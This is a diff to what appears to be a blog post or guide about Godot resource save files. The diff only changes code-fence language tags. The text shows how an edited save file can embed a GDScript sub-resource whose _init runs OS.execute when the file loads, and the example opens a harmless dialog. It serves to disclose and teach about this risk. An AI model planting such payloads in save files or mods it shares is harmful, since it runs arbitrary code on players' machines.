@@ -36,7 +36,7 @@ func _ready() -> void:
 
 If you open your save file with a text editor, it looks like this:
 
-```
+```txt
 [gd_resource type="Resource" script_class="SaveFile" format=3]
 
 [ext_resource type="Script" path="res://save_file.gd" id="1_dw8s2"]
@@ -48,21 +48,21 @@ lives = 3
 
 There are 2 changes you need to make to execute arbitrary code. First, add a sub-resource that contains a script. This script can do absolutely anything, mine will show a little dialog message using an external program.
 
-```
+```text
 [sub_resource type="GDScript" id="1"]
 script/source = "extends Resource; func _init(): OS.execute('kdialog', ['--yesno', 'Been pwned lately?', '--no-label', 'Hell yes!'])"
 ```
 
 Now we need a way to execute the code. Notice how we use `_init` function here, it's called every time the resource is loaded. Changing `script` property of `[resource]` will do it:
 
-```
+```text
 [resource]
 script = SubResource("1")
 ```
 
 That's all! Full compromised save file file looks like this:
 
-```
+```text
 [gd_resource type="Resource" script_class="SaveFile" format=3]
 
 [ext_resource type="Script" path="res://save_file.gd" id="1_dw8s2"]
